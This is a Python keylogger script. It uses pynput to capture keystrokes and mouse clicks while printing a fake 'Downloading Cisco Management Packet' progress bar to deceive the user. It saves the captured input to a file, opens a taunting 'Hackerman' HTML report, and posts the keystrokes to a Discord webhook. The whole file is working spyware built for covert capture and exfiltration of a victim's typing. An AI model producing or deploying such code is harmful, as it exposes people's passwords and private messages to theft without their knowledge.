from flask import Flask, render_template_string
import os
import platform
from pynput import keyboard, mouse
import time
import threading
import requests
import webbrowser

RECORD_DURATION = 10
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"

app = Flask(__name__)

if platform.system() == "Windows":
    documents_path = os.path.join(os.environ["USERPROFILE"], "Documents")
else:
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")

file_path = os.path.join(documents_path, "keylogger.txt")

if not os.path.exists(documents_path):
    os.makedirs(documents_path)

record_duration = RECORD_DURATION
start_time = time.time()
key_presses = []
mouse_clicks = 0
webhook_url = WEBHOOK_URL

template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keylogger Report</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: "Courier New", monospace;
            margin: 20px;
        }
        a {
            color: lime;
            text-decoration: none;
        }
        h1 {
            color: lime;
            font-size: 36px;
            font-weight: bold;
            text-align: center;
        }
        pre, code {
            color: lime;
            font-family: "Courier New", monospace;
            font-size: 14px;
            background-color: #000;
            padding: 10px;
            white-space: pre-wrap;
            overflow-x: auto;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
        }
        p {
            color: #0f0;
            font-size: 16px;
            line-height: 1.5;
            text-align: center;
            margin-top: 20px;
        }
        img {
            max-width: 100%;
            height: auto;
            margin-top: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        .container {
            background-color: #000;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Keylogger Report</h1>
        <pre>{{ key_presses }}</pre>
        <p>{{ user_profile }}, remember that curiosity is not always appreciated…</p>
        <img src="https://media.tenor.com/yOwKX_hMp6cAAAAd/hackerman-rami-malek.gif" alt="Hackerman GIF">
    </div>
</body>
</html>
"""

def on_press(key):
    if key in [
        keyboard.Key.backspace,
        keyboard.Key.space,
        keyboard.Key.enter,
        keyboard.Key.caps_lock,
        keyboard.Key.shift,
        keyboard.Key.shift_r,
        keyboard.Key.alt,
        keyboard.Key.alt_l,
        keyboard.Key.ctrl,
        keyboard.Key.tab,
        keyboard.Key.ctrl_r,
        keyboard.Key.ctrl_l,
        keyboard.Key.alt_gr,
    ]:
        if key == keyboard.Key.space:
            key_presses.append(" ")
        return
    try:
        key_presses.append(key.char)
    except AttributeError:
        key_presses.append(str(key))

def on_click(x, y, button, pressed):
    global mouse_clicks
    if button == mouse.Button.left and pressed:
        key_presses.append(" ")
        mouse_clicks += 1

def start_web_server():
    os.chdir(documents_path)
    with app.app_context():
        rendered_html = render_template_string(
            template,
            key_presses="".join(key_presses),
            user_profile=user_profile,
        )
        with open("keylogger_report.html", "w", encoding="utf-8") as html_file:
            html_file.write(rendered_html)
        webbrowser.open("file://" + os.path.abspath("keylogger_report.html"))
        payload = {"content": "".join(key_presses), "username": "Keylogger Bot"}
        requests.post(webhook_url, json=payload)

if __name__ == "__main__":
    print("Downloading Cisco Management Packet, please do not exit…\n")
    with keyboard.Listener(on_press=on_press) as key_listener:
        with mouse.Listener(on_click=on_click) as mouse_listener:
            while time.time() - start_time < record_duration:
                remaining_time = max(0, record_duration - (time.time() - start_time))
                progress = int((1 - remaining_time / record_duration) * 50)
                print(
                    f"\rProgress: [{'#' * progress}{'.' * (50 - progress)}] "
                    f"{int(remaining_time)}s remaining",
                    end="",
                    flush=True,
                )
                time.sleep(1)
            print("\n\nInstallation complete.")
    key_listener.stop()
    mouse_listener.stop()

    user_profile = os.path.basename(os.path.expanduser("~"))
    key_presses.append("")

    with open(file_path, "w") as file:
        file.write("".join(key_presses))

    threading.Thread(target=start_web_server).start()
